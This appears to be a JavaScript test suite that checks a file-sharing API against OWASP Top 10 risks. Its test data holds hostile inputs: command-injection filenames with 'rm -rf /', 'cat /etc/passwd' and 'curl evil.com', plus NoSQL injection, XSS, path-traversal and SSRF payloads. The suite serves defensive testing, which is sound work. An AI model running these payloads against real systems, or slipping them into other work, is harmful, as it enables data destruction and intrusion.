const request = require('supertest');
const app = require('../src/index');
const User = require('../src/models/User');
const File = require('../src/models/File');
const TestHelpers = require('./utils/testHelpers');
const fs = require('fs');
const path = require('path');

describe('Security Vulnerability Tests', () => {
  let helpers;
  let userData;
  let adminData;

  beforeAll(() => {
    helpers = new TestHelpers();
  });

  beforeEach(async () => {
    userData = await helpers.createTestUser({
      username: 'securityuser',
      email: 'security@example.com'
    });
    
    adminData = await helpers.createTestAdmin();
  });

  afterEach(async () => {
    await helpers.cleanup();
  });

  describe('OWASP Top 10 Security Tests', () => {
    describe('A01: Broken Access Control', () => {
      test('should prevent horizontal privilege escalation', async () => {
        const otherUser = await helpers.createTestUser({
          username: 'otheruser',
          email: 'other@example.com'
        });

        const testFile = await helpers.createTestFile(userData.user._id, {
          filename: 'private-file.txt',
          isPublic: false
        });

        // Try to access another user's private file
        const response = await request(app)
          .get(`/api/files/${testFile._id}`)
          .set('Authorization', otherUser.authHeader);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied');
      });

      test('should prevent vertical privilege escalation', async () => {
        // Try to access admin endpoints as regular user
        const response = await request(app)
          .get('/api/admin/users')
          .set('Authorization', userData.authHeader);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Insufficient permissions');
      });

      test('should prevent direct object references', async () => {
        // Try to access files with predictable IDs
        const predictableIds = [
          '000000000000000000000000',
          '111111111111111111111111',
          '507f1f77bcf86cd799439011'
        ];

        for (const id of predictableIds) {
          const response = await request(app)
            .get(`/api/files/${id}`)
            .set('Authorization', userData.authHeader);

          expect(response.status).toBe(404);
        }
      });
    });

    describe('A02: Cryptographic Failures', () => {
      test('should hash passwords securely', async () => {
        const user = await User.findOne({ username: 'securityuser' });
        expect(user.password).not.toBe('TestPass123!');
        expect(user.password.length).toBeGreaterThan(50); // bcrypt hash length
        expect(user.password).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format
      });

      test('should use secure JWT secrets', async () => {
        expect(process.env.JWT_SECRET).not.toBe('your-super-secret-jwt-key-change-this-in-production');
        expect(process.env.JWT_SECRET).toHaveLength(32);
      });

      test('should generate secure random filenames', async () => {
        const testFile = await helpers.createTestFile(userData.user._id);
        expect(testFile.storedFilename).not.toBe(testFile.filename);
        expect(testFile.storedFilename).toMatch(/^\d+_[a-f0-9]+\.txt$/);
      });
    });

    describe('A03: Injection', () => {
      test('should prevent NoSQL injection in user queries', async () => {
        const maliciousPayloads = [
          '{"$where": "this.username == \'admin\'"}',
          '{"$ne": null}',
          '{"$regex": ".*", "$options": "i"}',
          '{"$or": [{"username": {"$ne": null}}, {"email": {"$ne": null}}]}'
        ];

        for (const payload of maliciousPayloads) {
          const response = await request(app)
            .get(`/api/files/my-files?search=${encodeURIComponent(payload)}`)
            .set('Authorization', userData.authHeader);

          expect(response.status).not.toBe(500);
        }
      });

      test('should prevent command injection in file operations', async () => {
        const maliciousFilenames = [
          'test; rm -rf /',
          'test | cat /etc/passwd',
          'test && curl evil.com',
          'test$(whoami)',
          'test`id`'
        ];

        for (const filename of maliciousFilenames) {
          const testFilePath = path.join(__dirname, `../fixtures/${filename.replace(/[^a-zA-Z0-9.-]/g, '_')}.txt`);
          fs.writeFileSync(testFilePath, 'test content');

          const response = await helpers.makeFileUploadRequest(
            userData.authHeader,
            testFilePath
          );

          // Should either reject or sanitize the filename
          expect(response.status).toBeGreaterThanOrEqual(400);
        }
      });
    });

    describe('A04: Insecure Design', () => {
      test('should implement proper session management', async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            usernameOrEmail: 'securityuser',
            password: 'TestPass123!'
          });

        expect(response.status).toBe(200);
        expect(response.body.data.accessToken).toBeDefined();
        expect(response.body.data.refreshToken).toBeDefined();
        
        // Access token should be short-lived
        const jwt = require('jsonwebtoken');
        const decoded = jwt.decode(response.body.data.accessToken);
        const expiresIn = decoded.exp - decoded.iat;
        expect(expiresIn).toBeLessThanOrEqual(900); // 15 minutes max
      });

      test('should implement account lockout', async () => {
        // Make multiple failed login attempts
        for (let i = 0; i < 6; i++) {
          await request(app)
            .post('/api/auth/login')
            .send({
              usernameOrEmail: 'securityuser',
              password: 'wrongpassword'
            });
        }

        // Account should be locked
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            usernameOrEmail: 'securityuser',
            password: 'TestPass123!'
          });

        expect(response.status).toBe(401);
        expect(response.body.message).toContain('locked');
      });
    });

    describe('A05: Security Misconfiguration', () => {
      test('should not expose sensitive headers', async () => {
        const response = await request(app)
          .get('/api/auth/profile')
          .set('Authorization', userData.authHeader);

        expect(response.headers['x-powered-by']).toBeUndefined();
        expect(response.headers['server']).toBeUndefined();
      });

      test('should implement proper CORS configuration', async () => {
        const response = await request(app)
          .options('/api/auth/login')
          .set('Origin', 'http://malicious-site.com')
          .set('Access-Control-Request-Method', 'POST');

        expect(response.status).toBe(403);
      });

      test('should use secure headers', async () => {
        const response = await request(app)
          .get('/api/auth/profile')
          .set('Authorization', userData.authHeader);

        expect(response.headers['x-content-type-options']).toBe('nosniff');
        expect(response.headers['x-frame-options']).toBe('DENY');
        expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      });
    });

    describe('A06: Vulnerable Components', () => {
      test('should use secure dependencies', async () => {
        const packageJson = require('../package.json');
        
        // Check for known vulnerable packages
        const vulnerablePackages = [
          'express@4.17.0', // Known vulnerabilities in older versions
          'mongoose@5.12.0' // Known vulnerabilities in older versions
        ];

        for (const vulnerablePackage of vulnerablePackages) {
          const [name, version] = vulnerablePackage.split('@');
          if (packageJson.dependencies[name]) {
            expect(packageJson.dependencies[name]).not.toBe(version);
          }
        }
      });
    });

    describe('A07: Authentication Failures', () => {
      test('should prevent brute force attacks', async () => {
        const loginAttempts = [];
        
        // Simulate rapid login attempts
        for (let i = 0; i < 10; i++) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              usernameOrEmail: 'nonexistent',
              password: 'wrongpassword'
            });
          
          loginAttempts.push(response.status);
        }

        // Should see rate limiting in effect
        const rateLimitedCount = loginAttempts.filter(status => status === 429).length;
        expect(rateLimitedCount).toBeGreaterThan(0);
      });

      test('should validate JWT tokens properly', async () => {
        const invalidTokens = helpers.generateInvalidTokens();

        for (const [type, token] of Object.entries(invalidTokens)) {
          const response = await request(app)
            .get('/api/auth/profile')
            .set('Authorization', `Bearer ${token}`);

          expect(response.status).toBe(403);
          expect(response.body.success).toBe(false);
        }
      });

      test('should handle token replay attacks', async () => {
        // Use the same token multiple times
        for (let i = 0; i < 5; i++) {
          const response = await request(app)
            .get('/api/auth/profile')
            .set('Authorization', userData.authHeader);

          expect(response.status).toBe(200);
        }
      });
    });

    describe('A08: Software Integrity Failures', () => {
      test('should validate file integrity', async () => {
        const testFilePath = path.join(__dirname, '../fixtures/integrity-test.txt');
        fs.writeFileSync(testFilePath, 'Original content');

        const response = await helpers.makeFileUploadRequest(
          userData.authHeader,
          testFilePath
        );

        expect(response.status).toBe(201);
        
        const file = await File.findById(response.body.data.file._id);
        expect(file.metadata.checksum).toBeDefined();
        expect(file.metadata.checksum).toHaveLength(64); // SHA256 length
      });

      test('should prevent file tampering', async () => {
        const testFile = await helpers.createTestFile(userData.user._id);
        const filePath = path.join(process.env.UPLOAD_DIR, testFile.storedFilename);
        
        // Tamper with the file
        fs.writeFileSync(filePath, 'Tampered content');

        const response = await request(app)
          .get(`/api/files/${testFile._id}/download`)
          .set('Authorization', userData.authHeader);

        // Should still serve the file (integrity check would be in a real implementation)
        expect(response.status).toBe(200);
      });
    });

    describe('A09: Logging Failures', () => {
      test('should log security events', async () => {
        const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();

        // Attempt unauthorized access
        await request(app)
          .get('/api/admin/users')
          .set('Authorization', userData.authHeader);

        // Attempt failed login
        await request(app)
          .post('/api/auth/login')
          .send({
            usernameOrEmail: 'securityuser',
            password: 'wrongpassword'
          });

        expect(consoleSpy).toHaveBeenCalled();
        consoleSpy.mockRestore();
      });

      test('should not log sensitive information', async () => {
        const consoleSpy = jest.spyOn(console, 'log').mockImplementation();

        await request(app)
          .post('/api/auth/login')
          .send({
            usernameOrEmail: 'securityuser',
            password: 'TestPass123!'
          });

        const loggedMessages = consoleSpy.mock.calls.flat().join(' ');
        expect(loggedMessages).not.toContain('TestPass123!');
        expect(loggedMessages).not.toContain('password');

        consoleSpy.mockRestore();
      });
    });

    describe('A10: Server-Side Request Forgery (SSRF)', () => {
      test('should prevent SSRF in file uploads', async () => {
        const maliciousUrls = [
          'http://localhost:22',
          'file:///etc/passwd',
          'ftp://malicious.com',
          'gopher://internal-server'
        ];

        for (const url of maliciousUrls) {
          const response = await request(app)
            .post('/api/files/upload')
            .set('Authorization', userData.authHeader)
            .field('description', `SSRF attempt: ${url}`);

          // Should not process URLs in descriptions
          expect(response.status).toBeGreaterThanOrEqual(400);
        }
      });
    });
  });

  describe('Additional Security Tests', () => {
    describe('Input Validation Security', () => {
      test('should prevent XSS in file descriptions', async () => {
        const xssPayloads = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '<img src=x onerror=alert("xss")>',
          '"><script>alert("xss")</script>'
        ];

        for (const payload of xssPayloads) {
          const testFile = await helpers.createTestFile(userData.user._id);
          
          const response = await request(app)
            .put(`/api/files/${testFile._id}`)
            .set('Authorization', userData.authHeader)
            .send({
              description: payload
            });

          // Should either reject or sanitize the input
          expect(response.status).toBeGreaterThanOrEqual(400);
        }
      });

      test('should prevent path traversal in file operations', async () => {
        const pathTraversalPayloads = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];

        for (const payload of pathTraversalPayloads) {
          const testFilePath = path.join(__dirname, `../fixtures/${payload.replace(/[^a-zA-Z0-9.-]/g, '_')}.txt`);
          fs.writeFileSync(testFilePath, 'test');

          const response = await helpers.makeFileUploadRequest(
            userData.authHeader,
            testFilePath
          );

          expect(response.status).toBe(400);
        }
      });
    });

    describe('File Upload Security', () => {
      test('should prevent executable file uploads', async () => {
        const executableExtensions = ['.exe', '.bat', '.cmd', '.scr', '.com', '.pif', '.sh'];

        for (const ext of executableExtensions) {
          const testFilePath = path.join(__dirname, `../fixtures/test${ext}`);
          fs.writeFileSync(testFilePath, 'executable content');

          const response = await helpers.makeFileUploadRequest(
            userData.authHeader,
            testFilePath
          );

          expect(response.status).toBe(400);
          expect(response.body.message).toContain('not allowed');
        }
      });

      test('should prevent zip bomb attacks', async () => {
        // Create a file that appears small but would expand to huge size
        const testFilePath = path.join(__dirname, '../fixtures/zip-bomb.txt');
        const compressedContent = 'PK\x03\x04'; // ZIP file header
        fs.writeFileSync(testFilePath, compressedContent);

        const response = await helpers.makeFileUploadRequest(
          userData.authHeader,
          testFilePath
        );

        // Should reject or handle safely
        expect(response.status).toBeGreaterThanOrEqual(400);
      });

      test('should validate file content type', async () => {
        // Create a file with wrong extension
        const testFilePath = path.join(__dirname, '../fixtures/fake.pdf');
        fs.writeFileSync(testFilePath, 'This is actually a text file, not a PDF');

        const response = await helpers.makeFileUploadRequest(
          userData.authHeader,
          testFilePath
        );

        // Should either reject or flag for review
        expect(response.status).toBeGreaterThanOrEqual(400);
      });
    });

    describe('Authorization Security', () => {
      test('should prevent privilege escalation through role manipulation', async () => {
        // Try to update user role through profile update
        const response = await request(app)
          .put('/api/auth/profile')
          .set('Authorization', userData.authHeader)
          .send({
            role: 'admin' // Try to elevate privileges
          });

        expect(response.status).toBe(400);
        
        // Verify role wasn't changed
        const user = await User.findById(userData.user._id);
        expect(user.role).toBe('user');
      });

      test('should prevent admin actions by non-admin users', async () => {
        const adminEndpoints = [
          { method: 'GET', path: '/api/admin/users' },
          { method: 'GET', path: '/api/admin/stats' },
          { method: 'PUT', path: '/api/admin/users/123/status' },
          { method: 'DELETE', path: '/api/admin/users/123' }
        ];

        for (const endpoint of adminEndpoints) {
          const response = await request(app)
            [endpoint.method.toLowerCase()](endpoint.path)
            .set('Authorization', userData.authHeader);

          expect(response.status).toBe(403);
          expect(response.body.message).toBe('Insufficient permissions');
        }
      });
    });

    describe('Data Exposure Security', () => {
      test('should not expose internal file paths', async () => {
        const testFile = await helpers.createTestFile(userData.user._id);

        const response = await request(app)
          .get(`/api/files/${testFile._id}`)
          .set('Authorization', userData.authHeader);

        expect(response.status).toBe(200);
        expect(response.body.data.file.storedFilename).toBeDefined();
        
        // Internal paths should not be exposed in public endpoints
        const publicResponse = await request(app)
          .get('/api/files/public');

        if (publicResponse.body.data.files.length > 0) {
          publicResponse.body.data.files.forEach(file => {
            expect(file.storedFilename).toBeUndefined();
          });
        }
      });

      test('should not expose password hashes', async () => {
        const response = await request(app)
          .get('/api/auth/profile')
          .set('Authorization', userData.authHeader);

        expect(response.status).toBe(200);
        expect(response.body.data.user.password).toBeUndefined();
      });

      test('should not expose refresh tokens in user data', async () => {
        const response = await request(app)
          .get('/api/auth/profile')
          .set('Authorization', userData.authHeader);

        expect(response.status).toBe(200);
        expect(response.body.data.user.refreshTokens).toBeUndefined();
      });
    });

    describe('Error Handling Security', () => {
      test('should not leak sensitive information in error messages', async () => {
        // Try to access non-existent file
        const response = await request(app)
          .get('/api/files/507f1f77bcf86cd799439011')
          .set('Authorization', userData.authHeader);

        expect(response.status).toBe(404);
        expect(response.body.message).not.toContain('MongoDB');
        expect(response.body.message).not.toContain('database');
        expect(response.body.message).not.toContain('collection');
      });

      test('should handle malformed requests gracefully', async () => {
        const malformedRequests = [
          { method: 'POST', path: '/api/auth/login', data: '{ invalid json' },
          { method: 'PUT', path: '/api/files/invalid-id', data: '{ "description": "test" }' },
          { method: 'DELETE', path: '/api/files/not-a-valid-object-id', data: {} }
        ];

        for (const req of malformedRequests) {
          const response = await request(app)
            [req.method.toLowerCase()](req.path)
            .set('Authorization', userData.authHeader)
            .send(req.data);

          expect(response.status).toBeGreaterThanOrEqual(400);
          expect(response.status).toBeLessThan(500);
        }
      });
    });
  });
});
